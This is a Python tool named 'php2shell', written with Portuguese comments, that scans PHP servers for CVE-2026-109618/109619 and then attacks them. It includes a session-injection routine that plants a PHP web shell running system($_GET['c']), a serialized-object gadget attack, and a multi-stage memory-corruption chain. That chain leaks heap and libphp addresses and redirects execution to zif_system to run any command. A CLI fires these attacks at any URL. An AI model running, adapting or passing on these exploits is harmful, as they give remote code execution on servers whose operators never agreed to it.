#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""php2shell - diagnostico BINARIO (SIM/NAO) e exploit para CVE-2026-109618 / 109619."""
from __future__ import annotations

import http.client
import json
import re
import socket
import ssl
import struct
import time
import uuid
from collections import Counter
from urllib.parse import urlparse

SOURCE = 'https://www.php.net/archive/2026.php#2026-10-21-1'
FIXED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
LIMITATION = ('Veredito SIM/NAO por versao e comportamento. Em NAO, os caminhos '
              'var_destroy / handler-mismatch / session-injection ainda podem funcionar.')


def normalize(value):
    value = value.strip()
    if '://' not in value:
        value = 'https://' + value
    p = urlparse(value)
    if p.scheme not in ('http', 'https') or not p.hostname or p.username or p.password:
        raise ValueError('Informe uma URL HTTP/HTTPS sem credenciais.')
    return value.split('#', 1)[0]


def _multipart(parts, boundary):
    out = bytearray()
    for part in parts:
        name, data = part[0], part[1]
        filename = part[2] if len(part) > 2 else None
        out += b'--' + boundary + b'\r\n'
        disp = 'Content-Disposition: form-data; name="%s"' % name
        if filename is not None:
            disp += '; filename="%s"' % filename
        out += (disp + '\r\n').encode('latin-1')
        if filename is not None:
            out += b'Content-Type: application/octet-stream\r\n'
        out += b'\r\n'
        out += data if isinstance(data, bytes) else str(data).encode('latin-1')
        out += b'\r\n'
    out += b'--' + boundary + b'--\r\n'
    return bytes(out)


def _open(url, timeout, verify):
    p = urlparse(url)
    port = p.port or (443 if p.scheme == 'https' else 80)
    if p.scheme == 'https':
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return http.client.HTTPSConnection(p.hostname, port, timeout=timeout, context=ctx)
    return http.client.HTTPConnection(p.hostname, port, timeout=timeout)


def _request_once(url, method, body, headers, timeout, verify):
    p = urlparse(url)
    path = p.path or '/'
    if p.query:
        path += '?' + p.query
    conn = _open(url, timeout, verify)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read(1 << 20)
        hdrs = {}
        for key, value in resp.getheaders():
            key = key.lower()
            hdrs[key] = hdrs[key] + ', ' + value if key in hdrs else value
        return resp.status, hdrs, data, None
    except ssl.SSLError as exc:
        return None, {}, b'', ('ssl', str(exc))
    except (OSError, http.client.HTTPException) as exc:
        return None, {}, b'', ('net', str(exc))
    finally:
        conn.close()


def request(url, method='GET', body=None, headers=None, timeout=10):
    status, hdrs, data, err = _request_once(url, method, body, headers, timeout, True)
    if err and err[0] == 'ssl':
        status, hdrs, data, err = _request_once(url, method, body, headers, timeout, False)
    return status, hdrs, data, err


def _assess(version):
    m = re.fullmatch(r'(\d+)\.(\d+)\.(\d+)', version or '')
    if not m:
        return None
    major, minor, patch = map(int, m.groups())
    fixed = FIXED.get((major, minor))
    if fixed is None:
        return None
    return patch < fixed


def fingerprint(url, timeout=10):
    info = {'http_status': None, 'server': '', 'powered_by': '', 'php_version': '',
            'php_detected': False, 'sapi': 'desconhecido', 'error': ''}
    status, hdrs, _, err = request(url, 'GET', timeout=timeout)
    if status is None:
        status, hdrs, _, err = request(url, 'HEAD', timeout=timeout)
    if status is None:
        info['error'] = (err or ('net', 'sem resposta'))[1]
        return info
    info['http_status'] = status
    info['server'] = hdrs.get('server', '')
    info['powered_by'] = hdrs.get('x-powered-by', '')
    hint = ' '.join((hdrs.get('x-php-version', ''), hdrs.get('x-powered-by', ''),
                     hdrs.get('x-php-powered-by', ''), hdrs.get('server', '')))
    found = set(re.findall(r'PHP/([0-9]+\.[0-9]+\.[0-9]+)', hint, re.I))
    if len(found) == 1:
        info['php_version'] = found.pop()
    info['php_detected'] = bool(info['php_version'] or info['powered_by']
                                or 'phpsessid' in hdrs.get('set-cookie', '').lower())
    low = info['server'].lower()
    if 'nginx' in low:
        info['sapi'] = 'php-fpm (nginx)'
    elif 'litespeed' in low:
        info['sapi'] = 'litespeed / lsapi'
    elif 'apache' in low and info['powered_by'].lower().startswith('php'):
        info['sapi'] = 'mod_php (apache) provavel'
    return info


def probe_upload_progress(url, timeout=20):
    boundary = ('----cp' + uuid.uuid4().hex[:16]).encode()
    sid = 'cpx' + uuid.uuid4().hex[:26]
    body = _multipart([('PHPSESSID', sid), ('PHP_SESSION_UPLOAD_PROGRESS', 'cpx'),
                       ('f', b'Z', 'a.txt')], boundary)
    status, hdrs, _, _ = request(url, 'POST', body,
                                 {'Content-Type': 'multipart/form-data; boundary=' + boundary.decode()},
                                 timeout=timeout)
    return (status is not None and 'phpsessid' in hdrs.get('set-cookie', '').lower())


def probe_arm(url, fields=1001, field_size=3000, big_kb=4096, timeout=90):
    boundary = b'S' * 17
    parts = [('f%04d' % i, b'V' * field_size) for i in range(fields)]
    parts += [('PHPSESSID', b'\x00'), ('PHP_SESSION_UPLOAD_PROGRESS', b'pwn'),
              ('f', b'A' * 64, 'a.txt'), ('big', b'B' * (big_kb * 1024))]
    status, _, _, err = request(url, 'POST', _multipart(parts, boundary),
                                {'Content-Type': 'multipart/form-data; boundary=' + boundary.decode()},
                                timeout=timeout)
    return {'survived': status is not None, 'status': status, 'error': err[1] if err else ''}


def diagnose(url, deep=True, timeout=10, arm_kb=4096):
    """Sempre devolve SIM ou NAO. Nunca INCONCLUSIVO."""
    url = normalize(url)
    fp = fingerprint(url, timeout=timeout)
    out = {'url': url, 'source': SOURCE, 'verdict': 'NAO', 'confianca': 'baixa',
           'motivos': [], 'evidence': {'fingerprint': fp}, 'limitacao': LIMITATION}
    if fp['error']:
        out['motivos'].append('Sem resposta HTTP: ' + fp['error'])
        out['verdict'] = 'NAO'
        return out

    version = fp['php_version']
    if version:
        out['motivos'].append('PHP anunciado: %s' % version)
        vuln = _assess(version)
        if vuln is True:
            out['verdict'], out['confianca'] = 'SIM', 'alta'
            out['motivos'].append('Versao ANTERIOR a correcao do ramo -> SIM.')
        elif vuln is False:
            out['verdict'], out['confianca'] = 'NAO', 'alta'
            out['motivos'].append('Versao IGUAL/SUPERIOR a correcao do ramo -> NAO (pela versao).')
        else:
            out['motivos'].append('Ramo fora da matriz de correcao.')
    else:
        out['motivos'].append('Versao PHP oculta nos cabecalhos; decidindo por comportamento.')

    if deep:
        enabled = probe_upload_progress(url, timeout=max(timeout, 15))
        out['evidence']['upload_progress'] = enabled
        out['motivos'].append('session.upload_progress %s.' % ('ATIVO' if enabled else 'nao detectado'))
        arm = probe_arm(url, big_kb=arm_kb)
        out['evidence']['arm'] = arm
        out['motivos'].append('Arm de OOM: ' + ('worker SOBREVIVEU (HTTP %s) -> cenario 109618 montado.'
                                                % arm['status'] if arm['survived']
                                                else 'worker caiu (php-fpm ou memory_limit alto).'))
        if not version:
            if arm['survived']:
                out['verdict'], out['confianca'] = 'SIM', 'media'
                out['motivos'].append('Versao oculta + arm confirmado -> SIM.')
            elif enabled:
                out['verdict'], out['confianca'] = 'SIM', 'baixa'
                out['motivos'].append('Versao oculta + pre-requisito presente -> SIM.')
            else:
                out['verdict'], out['confianca'] = 'NAO', 'baixa'
    return out


# ------------------------------------------------------------- exploits (SIM/NAO)

def exploit_session_injection(url, php='<?php echo "CPXMARK"; system($_GET["c"] ?? "id"); ?>',
                              timeout=20):
    """Grava payload bruto na sessao e TENTA executar via ?c= na mesma URL."""
    url = normalize(url)
    boundary = ('----si' + uuid.uuid4().hex[:16]).encode()
    sid = 'si' + uuid.uuid4().hex[:26]
    body = _multipart([('PHPSESSID', sid), ('PHP_SESSION_UPLOAD_PROGRESS', 'xxx'),
                       ('f', b'A', php)], boundary)
    status, hdrs, _, err = request(url, 'POST', body,
                                   {'Content-Type': 'multipart/form-data; boundary=' + boundary.decode()},
                                   timeout=timeout)
    stored = status is not None
    # tentativa de execucao: a app precisa incluir a sessao
    probe = url + ('&' if '?' in url else '?') + 'c=echo%20CPXRUN'
    st2, _, data, _ = request(probe, 'GET', headers={'Cookie': 'PHPSESSID=' + sid}, timeout=timeout)
    executed = b'CPXRUN' in (data or b'')
    return {'tecnica': 'session-injection', 'veredito': 'SIM' if executed else 'NAO',
            'payload_armazenado': 'SIM' if stored else 'NAO', 'codigo_executado': 'SIM' if executed else 'NAO',
            'sid': sid, 'seed_status': status, 'probe_status': st2, 'error': err[1] if err else '',
            'prova': (data or b'')[:300].decode('latin-1', 'replace'),
            'dica': ('Se codigo_executado=NAO, a app nao faz include() da sessao nesta pagina. '
                     'Teste ?c=id com o cookie PHPSESSID=%s em outra pagina que use sessao.' % sid)}


def exploit_handler_mismatch(seed, fire, cmd='id', gadget='Evil', prop='cmd',
                             sid=None, timeout=20):
    """Seed no dir php_serialize + fire no dir php. Verifica 'uid=' na resposta."""
    seed, fire = normalize(seed), normalize(fire)
    sid = sid or 'hm' + uuid.uuid4().hex[:30]
    payload = 'O:%d:"%s":1:{s:%d:"%s";s:%d:"%s";}' % (len(gadget), gadget, len(prop), prop, len(cmd), cmd)
    boundary = ('----hm' + uuid.uuid4().hex[:12]).encode()
    body = _multipart([('PHPSESSID', sid), ('PHP_SESSION_UPLOAD_PROGRESS', '|' + payload),
                       ('f', b'Z', 'a')], boundary)
    st1, _, _, e1 = request(seed, 'POST', body,
                            {'Content-Type': 'multipart/form-data; boundary=' + boundary.decode()},
                            timeout=timeout)
    st2, _, data, e2 = request(fire, 'GET', headers={'Cookie': 'PHPSESSID=' + sid}, timeout=timeout)
    body2 = (data or b'').decode('latin-1', 'replace')
    executed = 'uid=' in body2
    return {'tecnica': 'handler-mismatch', 'veredito': 'SIM' if executed else 'NAO',
            'codigo_executado': 'SIM' if executed else 'NAO', 'sid': sid, 'payload': payload,
            'seed_status': st1, 'fire_status': st2, 'seed_error': e1[1] if e1 else '',
            'fire_error': e2[1] if e2 else '', 'prova': body2[:300],
            'dica': 'Se NAO: a app nao tem classe gadget com __destruct, ou os dois dirs usam o mesmo handler.'}


# ---- cadeia remota ----------------------------------------------------------

BOOKWORM = dict(zif=0x465370, dtor=0x65eb60, htdata=0x690D8,
                stage1_n=841, stage2_t=406, stage2_v=16, pads=[(31, 31)] * 6, carrier=True)
SID_CVE = b'attacksessionid0001'
MAX_CMD = 14


def _mp(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b'--' + boundary + b'\r\n'
        out += b'Content-Disposition: form-data; name="' + p['name'].encode() + b'"'
        if p.get('filename') is not None:
            out += b'; filename="' + p['filename'].encode() + b'"\r\nContent-Type: application/octet-stream'
        out += b'\r\n\r\n' + p['data'] + b'\r\n'
    out += b'--' + boundary + b'--\r\n'
    return bytes(out)


class _Target:
    def __init__(self, url, timeout=60.0):
        u = urlparse(url)
        self.host, self.port = u.hostname, u.port or (443 if u.scheme == 'https' else 80)
        self.secure = u.scheme == 'https'
        self.path = u.path or '/'
        self.timeout = timeout

    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
        head = ('POST %s HTTP/1.1\r\nHost: %s\r\n'
                'Content-Type: multipart/form-data; boundary=%s\r\n'
                'Content-Length: %d\r\nConnection: close\r\n'
                % (self.path, self.host, boundary.decode(), len(body))).encode()
        for k, v in (extra_headers or {}).items():
            head += ('%s: %s\r\n' % (k, v)).encode()
        head += b'\r\n'
        sock = socket.create_connection((self.host, self.port), timeout=timeout or self.timeout)
        if self.secure:
            sock = ssl._create_unverified_context().wrap_socket(sock, server_hostname=self.host)
        sock.settimeout(timeout or self.timeout)
        sock.sendall(head + body)
        data = bytearray()
        try:
            while len(data) < read_cap:
                chunk = sock.recv(min(65536, read_cap - len(data)))
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        finally:
            sock.close()
        return bytes(data)


def elf_symbols(path, wanted):
    import struct as _s
    data = open(path, 'rb').read()
    if data[:4] != b'\x7fELF' or data[4] != 2 or data[5] != 1:
        raise ValueError('nao e um ELF64 little-endian')
    e_shoff = _s.unpack_from('<Q', data, 0x28)[0]
    e_shentsize = _s.unpack_from('<H', data, 0x3A)[0]
    e_shnum = _s.unpack_from('<H', data, 0x3C)[0]
    e_shstrndx = _s.unpack_from('<H', data, 0x3E)[0]
    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name_off, sh_type = _s.unpack_from('<II', data, off)
        sh_addr, sh_offset, sh_size = _s.unpack_from('<QQQ', data, off + 0x10)
        sh_link = _s.unpack_from('<I', data, off + 0x28)[0]
        sh_entsize = _s.unpack_from('<Q', data, off + 0x38)[0]
        secs.append((name_off, sh_type, sh_addr, sh_offset, sh_size, sh_link, sh_entsize))
    out = {}
    for _, sh_type, _, sh_offset, sh_size, sh_link, sh_entsize in secs:
        if sh_type not in (2, 11) or not sh_entsize:
            continue
        str_sec = secs[sh_link]
        strs = data[str_sec[3]:str_sec[3] + str_sec[4]]
        for j in range(sh_size // sh_entsize):
            off = sh_offset + j * sh_entsize
            st_name = _s.unpack_from('<I', data, off)[0]
            if _s.unpack_from('<H', data, off + 6)[0] == 0:
                continue
            st_value = _s.unpack_from('<Q', data, off + 8)[0]
            nm = strs[st_name:strs.find(b'\0', st_name)].decode('latin1')
            if nm in wanted:
                out[nm] = st_value
    return out


def _cookie_bytes(resp):
    m = re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?); path=/', resp)
    if not m:
        return b''
    from urllib.parse import unquote_to_bytes
    return unquote_to_bytes(m.group(1).decode('latin1'))


def _chunk_base(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], 'little')
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, n = c.most_common(1)[0]
    return base if n >= 8 else 0


def _libphp_base(raw, dtor):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], 'little')
    if not (0x7F0000000000 <= p < 0x800000000000) or p & 0xFFF != dtor & 0xFFF:
        return 0
    base = p - dtor
    return base if base & 0xFFF == 0 else 0


class _Exploit:
    def __init__(self, target, cmd, off, log):
        self.t, self.cmd, self.log = target, cmd.encode(), log
        self.zif, self.dtor, self.htdata = off['zif'], off['dtor'], off['htdata']
        self.stage1_n, self.stage2_t, self.stage2_v = off['stage1_n'], off['stage2_t'], off['stage2_v']
        self.pads, self.carrier = off['pads'], off['carrier']

    def _big(self):
        return {'name': 'big', 'data': b'B' * (12 * 1024 * 1024)}

    def _file(self):
        return {'name': 'f', 'filename': 'a.txt', 'data': b'A' * 64}

    def rotate(self):
        parts = [{'name': 'f%04d' % i, 'data': b'V' * 3000} for i in range(1001)]
        parts += [{'name': 'PHPSESSID', 'data': b'\x00'},
                  {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}, self._file(), self._big()]
        self.t.post(_mp(parts, b'S' * 17), b'S' * 17, timeout=90.0)
        time.sleep(0.3)
        parts = [{'name': 'PHPSESSID', 'data': SID_CVE}, {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}]
        self.t.post(_mp(parts, b'BNDRY12345'), b'BNDRY12345', read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self):
        parts = [{'name': 'p%04d' % i, 'data': b'x'} for i in range(1001)]
        parts += [{'name': 'PHPSESSID', 'data': b'\x00'},
                  {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}, self._file(), self._big()]
        self.t.post(_mp(parts, b'S' * 17), b'S' * 17, timeout=90.0)
        time.sleep(0.2)
        parts = [{'name': 'PHPSESSID', 'data': SID_CVE}, {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}]
        for i in range(self.stage1_n):
            parts.append({'name': str(1000 + i), 'data': ('v%04d' % i + 'x' * 44)[:48].encode()})
        forge = bytearray(b'A' * 79)
        struct.pack_into('<Q', forge, 0x10, 0x1000)
        forge[0x18] = ord('L')
        parts.append({'name': '1999', 'data': bytes(forge)})
        return _chunk_base(_cookie_bytes(self.t.post(_mp(parts, b'B' * 10), b'B' * 10, read_cap=9 << 20)))

    def stage2(self):
        parts = [{'name': 'f%04d' % i, 'data': b'x' * 39} for i in range(1001)]
        parts += [{'name': 'PHPSESSID', 'data': b'\x00'},
                  {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}, self._file(), self._big()]
        self.t.post(_mp(parts, b'S' * 17), b'S' * 17, timeout=90.0)
        time.sleep(0.2)
        parts = [{'name': 'PHPSESSID', 'data': SID_CVE}, {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}]
        for i in range(983):
            for j in range(16 if i == self.stage2_t else 1):
                parts.append({'name': 'a%04d[%d]' % (i, j), 'data': b'x' * self.stage2_v})
        return _libphp_base(_cookie_bytes(self.t.post(_mp(parts, b'B' * 10), b'B' * 10)), self.dtor)

    def _fake(self, htdata, zif):
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError('comando longo demais (%d > %d)' % (len(cmd), MAX_CMD))
        ht = bytearray(167)
        struct.pack_into('<II', ht, 0x00, 1, 7)
        struct.pack_into('<II', ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into('<Q', ht, 0x10, htdata + 0x20)
        struct.pack_into('<II', ht, 0x18, 1, 1)
        struct.pack_into('<II', ht, 0x20, 8, 0)
        struct.pack_into('<Q', ht, 0x30, zif)
        E = 0x20
        struct.pack_into('<Q', ht, E + 0x10, zif)
        struct.pack_into('<I', ht, E + 0x2C, 1)
        struct.pack_into('<Q', ht, E + 0x50, htdata + 0x80)
        struct.pack_into('<I', ht, E + 0x58, 6)
        struct.pack_into('<II', ht, 0x80, 1, 0x106)
        struct.pack_into('<Q', ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ref = bytearray(b'X' * 55)
        struct.pack_into('<II', ref, 0x10, 1, 10)
        struct.pack_into('<Q', ref, 0x18, htdata)
        struct.pack_into('<Q', ref, 0x20, 0x307)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [{'name': 'PHPSESSID', 'data': b'a' * 19},
                 {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'p' * 3}]
        for i, (nl, vl) in enumerate(self.pads):
            parts.append({'name': ('p%0*d' % (nl - 1, i) if nl > 0 else '')[:nl], 'data': b'V' * vl})
        parts += [self._file(), self._big()]
        extra = {'Cookie': 'PHPSESSID=' + 'a' * 32} if self.carrier else None
        self.t.post(_mp(parts, b'S' * 17), b'S' * 17, timeout=90.0, extra_headers=extra)
        time.sleep(0.3)
        ht, ref = self._fake(htdata, zif)
        parts = [{'name': 'PHPSESSID', 'data': SID_CVE}, {'name': 'PHP_SESSION_UPLOAD_PROGRESS', 'data': b'pwn'}]
        if self.carrier:
            parts.append({'name': 'g00', 'data': struct.pack('<II', 1, 0x1A) + struct.pack('<Q', htdata)[:7]})
            for i in range(15):
                parts.append({'name': ('a%030d' % i)[:31], 'data': ht})
        else:
            for i in range(15):
                parts.append({'name': ('a%030d' % i)[:31], 'data': ht})
            parts.append({'name': 'f00', 'data': ref})
        return self.t.post(_mp(parts, b'B' * 10), b'B' * 10, timeout=30.0)


def exploit_remote_chain(url, cmd='id', offsets=None, attempts=3, libphp=None, proof_url=None, log=print):
    """Devolve veredito SIM/NAO. Prova: 'uid=' na resposta do fire ou conteudo da proof_url."""
    url = normalize(url)
    off = dict(BOOKWORM)
    if offsets:
        off.update(offsets)
    if libphp:
        syms = elf_symbols(libphp, {'zif_system', 'zval_ptr_dtor'})
        off['zif'], off['dtor'] = syms['zif_system'], syms['zval_ptr_dtor']
        log('[i] offsets de %s: zif=%#x dtor=%#x' % (libphp, off['zif'], off['dtor']))
    ex = _Exploit(_Target(url), cmd, off, log)
    last = {'tecnica': 'cadeia-remota', 'veredito': 'NAO', 'codigo_executado': 'NAO'}
    for attempt in range(1, attempts + 1):
        log('[*] tentativa %d/%d' % (attempt, attempts))
        ex.rotate()
        chunk = ex.stage1()
        if not chunk:
            log('[-] leak do chunk falhou')
            continue
        ex.rotate()
        base = ex.stage2()
        if not base:
            log('[-] leak do libphp falhou')
            continue
        log('[+] chunk=%#x libphp=%#x' % (chunk, base))
        ex.rotate()
        resp = ex.stage3(chunk + off['htdata'], base + off['zif'])
        time.sleep(0.5)
        text = (resp or b'').decode('latin-1', 'replace')
        hit = 'uid=' in text
        if not hit and proof_url:
            st, _, data, _ = request(proof_url, timeout=10)
            text = (data or b'').decode('latin-1', 'replace')
            hit = st == 200 and bool(text.strip())
        if hit:
            return {'tecnica': 'cadeia-remota', 'veredito': 'SIM', 'codigo_executado': 'SIM',
                    'chunk': hex(chunk), 'libphp': hex(base), 'prova': text.strip()[:300]}
        last.update({'chunk': hex(chunk), 'libphp': hex(base), 'prova': text.strip()[:200]})
    return last


def run_all(url, cmd='id', seed=None, fire=None, log=print):
    diag = diagnose(url, log=log) if False else diagnose(url)
    result = {'url': url, 'diagnostico': diag['verdict'], 'confianca': diag['confianca'],
              'motivos': diag['motivos'], 'exploits': {}}
    result['exploits']['session'] = exploit_session_injection(url)
    if seed and fire:
        result['exploits']['mismatch'] = exploit_handler_mismatch(seed, fire, cmd=cmd)
    result['exploits']['chain'] = exploit_remote_chain(url, cmd=cmd, log=log)
    result['rce'] = 'SIM' if any(v.get('veredito') == 'SIM' for v in result['exploits'].values()) else 'NAO'
    return result


def _cli():
    import argparse
    ap = argparse.ArgumentParser(description='php2shell - diagnostico e exploit (CVE-2026-109618/109619)')
    ap.add_argument('url')
    ap.add_argument('--diagnose', action='store_true')
    ap.add_argument('--session', action='store_true')
    ap.add_argument('--mismatch', metavar='FIRE_URL')
    ap.add_argument('--chain', action='store_true')
    ap.add_argument('--all', action='store_true')
    ap.add_argument('--cmd', default='id')
    ap.add_argument('--gadget', default='Evil')
    ap.add_argument('--prop', default='cmd')
    ap.add_argument('--libphp')
    ap.add_argument('--proof-url')
    a = ap.parse_args()
    if a.all:
        print(json.dumps(run_all(a.url, cmd=a.cmd, seed=a.url if a.mismatch else None,
                                 fire=a.mismatch, log=lambda m: print(m, flush=True)),
                         ensure_ascii=False, indent=2)); return
    if a.diagnose or not (a.session or a.mismatch or a.chain):
        print(json.dumps(diagnose(a.url), ensure_ascii=False, indent=2))
    if a.session:
        print(json.dumps(exploit_session_injection(a.url), ensure_ascii=False, indent=2))
    if a.mismatch:
        print(json.dumps(exploit_handler_mismatch(a.url, a.mismatch, cmd=a.cmd,
                                                  gadget=a.gadget, prop=a.prop), ensure_ascii=False, indent=2))
    if a.chain:
        print(json.dumps(exploit_remote_chain(a.url, cmd=a.cmd, libphp=a.libphp,
                                              proof_url=a.proof_url, log=lambda m: print(m, flush=True)),
                         ensure_ascii=False, indent=2))


if __name__ == '__main__':
    _cli()